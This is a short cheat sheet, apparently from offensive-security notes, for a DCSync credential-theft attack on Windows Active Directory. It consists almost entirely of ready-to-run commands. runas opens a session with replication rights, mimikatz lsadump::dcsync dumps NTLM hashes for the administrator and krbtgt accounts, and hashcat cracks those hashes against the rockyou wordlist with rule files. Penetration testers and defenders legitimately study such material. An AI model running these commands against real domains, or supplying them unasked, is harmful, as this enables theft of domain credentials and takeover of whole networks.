## DCSync Attack on Windows (Domain-Joined Machine)
1. Launch a Privileged PowerShell Session if we have the username and password that has DCSync rights
**Using runas.exe to open a session as the target user:**
```powershell
runas /netonly /user:YOURDOMAIN\User_With_Access_Rights powershell
```

2. Run Mimikatz in the Elevated Session
To perform `DCSync` from Windows, we can use [mimikatz](https://github.com/gentilkiwi/mimikatz):
**Start Mimikatz:**
```powershell
.\mimikatz.exe
```
**Inside Mimikatz, run the DCSync command:**
```powershell
lsadump::dcsync /domain:YOURDOMAIN.LOCAL /user:YOURDOMAIN\administrator
```
- **What It Does:** Requests replication data for the `administrator` account (or another account of your choice) from the domain controller. Mimikatz will display information including the NTLM hash and other credential details.
**Command**: Dump the NTLM hash of a target user:
```powershell
lsadump::dcsync /user:<domain>\<username>
```

```cmd
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt /csv"
```


## Cracking NTLM hashes in case the reversible encryption option not checked for users
```shell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
